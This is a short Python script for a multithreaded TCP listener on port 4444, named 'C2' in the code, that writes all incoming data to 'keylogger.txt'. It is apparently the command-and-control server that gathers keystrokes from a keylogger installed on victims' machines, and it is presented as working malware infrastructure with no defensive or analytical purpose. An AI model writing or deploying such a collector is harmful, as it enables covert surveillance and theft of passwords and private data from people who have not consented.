import socket
import os
import threading

class Server():

    def __init__(self, Server, Port):

        self.__Server = Server
        self.__Port = Port 

    def handle_client(self, conn, addr):

        print(f"Connected from {addr[0]}:{addr[1]}")

        with conn:

            while True:

                data = conn.recv(1024).decode('utf-8')

                with open("keylogger.txt", 'a') as f:
                    
                    f.write(data)

                if not data:

                    break

        print(f"Client: {addr[0]} has disconnected")
    
    def start_server(self):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            
            s.bind((self.__Server, self.__Port))
            s.listen(3)
            
            print(f"Server listening on {self.__Server}:{self.__Port}")
            print("Listening for connection...")

            while True:

                conn, addr = s.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(conn,addr))
                client_thread.start()


if __name__ == '__main__':

    Host = socket.gethostbyname(socket.gethostname())
    Port = 4444

    C2 = Server(Host, Port)
    C2.start_server()
